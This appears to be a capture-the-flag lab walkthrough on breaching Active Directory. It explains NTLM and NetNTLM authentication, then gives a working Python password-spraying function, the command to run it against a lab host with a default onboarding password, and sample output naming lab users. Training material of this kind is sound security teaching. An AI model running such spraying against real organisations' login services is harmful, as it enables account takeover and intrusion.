# NTLM and NetNTLM

**New Technology LAN Manager (NTLM)** is a suite of security protocols used to authenticate users in Active Directory (AD). NTLM uses a challenge-response-based scheme called **NetNTLM** for authentication. This mechanism is widely used by network services, some of which may be exposed to the internet. Common examples include:

- Internally-hosted Exchange (Mail) servers with an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) services exposed to the internet.
- VPN endpoints integrated with AD.
- Internet-facing web applications using NetNTLM.

NetNTLM (also known as Windows Authentication or NTLM Authentication) allows applications to act as intermediaries between clients and AD. Authentication material is forwarded to a Domain Controller as a challenge. If successful, the application authenticates the user without storing AD credentials, which should only reside on a Domain Controller.

---

## Brute-force Login Attacks

Exposed services are ideal for testing credentials discovered through other means. They can also be targeted directly to recover valid AD credentials. For example, if valid email addresses are found during reconnaissance, these can be used in brute-force attacks.

However, most AD environments have account lockout policies, making full brute-force attacks impractical. Instead, **password spraying** is used: one password is tried across all usernames, reducing the risk of lockouts. Note that such attacks can still be detected due to the volume of failed attempts.

Suppose you have a list of usernames from OSINT and know the organization's initial onboarding password is `Changeme123`. Users often forget to change this password. You can use a custom script to perform a password spraying attack against the web application at:  
`http://ntlmauth.za.tryhackme.com`

When visiting the URL, you are prompted for Windows Authentication credentials.

> **Note:** Firefox's Windows Authentication plugin is unreliable. Use Chrome for manual testing.

While tools like Hydra can assist with password spraying, custom scripts offer more control. Below is the main function from a provided Python script:

```python
def password_spray(self, password, url):
    print("[*] Starting passwords spray attack using the following password: " + password)
    count = 0
    for user in self.users:
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
            print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if self.verbose:
            if response.status_code == self.HTTP_AUTH_FAILED_CODE:
                print("[-] Failed login with Username: " + user)
    print("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

This function attempts authentication with each username and the given password, checking HTTP response codes to determine success (`200 OK`) or failure (`401 Unauthorized`).

---

## Password Spraying

If using the AttackBox, the script and usernames file are in `/root/Rooms/BreachingAD/task3/`. Run the script with:

```bash
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

**Parameters:**

- `<userfile>`: Usernames file (e.g., `usernames.txt`)
- `<fqdn>`: Fully qualified domain name (e.g., `za.tryhackme.com`)
- `<password>`: Password to spray (e.g., `Changeme123`)
- `<attackurl>`: Target URL (e.g., `http://ntlmauth.za.tryhackme.com`)

**Example output:**

```
[thm@thm]$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: henry.taylor
[...]
[+] Valid credential pair found! Username: [...] Password: Changeme123
[-] Failed login with Username: louise.talbot
[...]
[*] Password spray attack completed, [X] valid credential pairs found
```

By combining OSINT and NetNTLM password spraying, you can obtain valid credential pairs for further AD enumeration.